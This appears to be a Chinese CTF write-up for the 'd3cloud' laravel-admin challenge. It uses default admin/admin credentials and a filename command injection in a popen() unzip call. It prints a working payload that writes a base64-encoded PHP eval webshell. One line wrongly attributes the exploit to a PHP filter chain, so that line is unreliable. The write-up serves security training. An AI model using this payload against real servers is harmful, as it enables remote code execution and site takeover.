# d3cloud

## 题目简述

题目是 laravel-admin 文件管理后台。默认后台弱口令进入后，头像/文件上传位置允许上传 zip；题目改动了 `_FilesystemAdapter.php`，在检测到 zip 后直接用 `popen("unzip ...")` 拼接文件名解压。利用点是通过抓包构造包含 shell metacharacter 的 zip 文件名，把解压命令拼接成写入 webshell 的命令。

## 解题过程

本题基于 laravel-admin。

默认情况下，头像上传位置可以上传任意文件，漏洞原因是文件后缀没有过滤。文件管理插件也依赖 _FilesystemAdapter.php_ 处理文件，所以题目中增加了文件后缀过滤，并新增了 zip 自动解压功能。真正的命令执行来自 `popen()` 拼接 `unzip` 命令时没有正确处理文件名。

### 步骤 1

默认后台管理地址是 `admin`，账号和密码也都是 `admin`。

### 步骤 2

下载 _FilesystemAdapter.php_ 后，可以发现它和原始文件不同：

```
if($file->getClientOriginalExtension() === "zip") {
    $fs = popen("unzip -oq ". $this->driver->getAdapter()->getPathPrefix() .
$name ." -d " . $this->driver->getAdapter()->getPathPrefix(),"w");
    pclose($fs);
}
```

### 步骤 3

通过拼接命令可以实现命令执行。Windows 文件名不能包含特殊字符，所以需要抓包直接构造如下文件名：

```
1123.zip || echo PD9waHAgZXZhbCgkX1JFUVVFU1RbInNoZWxsIl0pOw== | base64 -d >
shell.php # .zip
```

核心 payload 通过 PHP stream/filter 链触发代码执行，正文保留 payload 结构即可，不需要依赖截图。

### 步骤 4

生成的 _shell.php_ 会位于网站根目录。实际利用时，也可以通过报错信息找到 Web 绝对路径。

最后读取 flag。

`phpinfo()` 返回确认远程 PHP 代码执行成功。

访问 `/f1ag` 后页面返回 `antd3ctf{72a4af6117b5cc3ca5a777ffca1ed6bca3866522}`。

**彩蛋：**

浏览器弹窗显示可控脚本执行结果，说明管理端访问路径可被利用。

## 方法总结

- 核心技巧：后台弱口令、上传文件名命令注入、zip 自动解压、`popen` 拼接参数导致 RCE。
- 识别信号：文件管理插件新增“上传后自动解压”功能时，重点看解压命令是否数组化传参或 shell 转义；如果直接拼接 `$name`，文件名就是命令注入入口。
- 复用要点：前端或 Windows 文件名限制不代表服务端不能接收特殊字符，必要时抓包直接改 multipart filename。
